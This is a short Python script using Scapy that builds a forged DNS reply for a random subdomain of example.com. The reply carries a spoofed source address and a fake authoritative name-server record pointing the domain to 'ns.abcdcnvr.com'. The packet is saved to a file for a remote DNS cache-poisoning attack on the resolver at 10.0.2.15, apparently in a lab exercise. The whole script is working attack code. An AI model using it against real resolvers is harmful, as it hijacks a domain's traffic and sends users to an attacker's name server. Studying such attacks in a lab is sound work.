#!/usr/bin/python3
from scapy.all import *

# Construction the DNS header and payload
name = 'aaaaa.example.com'

Qdsec=DNSQR(qname=name) # question sec
Anssec=DNSRR(rrname=name, type='A', rdata='1.1.1.1', ttl=259200) # ans sec
NSsec=DNSRR(rrname='example.com', type='NS', rdata='ns.abcdcnvr.com', ttl=259200)
dns = DNS(id=0xAAAA,
        aa=1, # num of ans sec
        rd=1, # since it is request packet
        qr=1, # num of question sec
        qdcount=1, # unmber of question
        ancount=1, # ans sec 1
        nscount=1, # name server is 1
        arcount=0, # num of additional sec
        qd=Qdsec,
        an=Anssec,
        ns=NSsec)

# IP of example.com 93.184.216.34
# IP of NS1 199.43.135.53
# IP of NS2 199.43.133.53
# Construction of IP, UDP headers and the entire packet
ip=IP(dst='10.0.2.15', src='1.2.3.4', chksum=0)
udp=UDP(dport=33333, sport=53, chksum=0)
pkt=ip/udp/dns

# Save the packet to a file
with open('ip_resp22.bin', 'wb') as f:
    f.write(bytes(pkt))
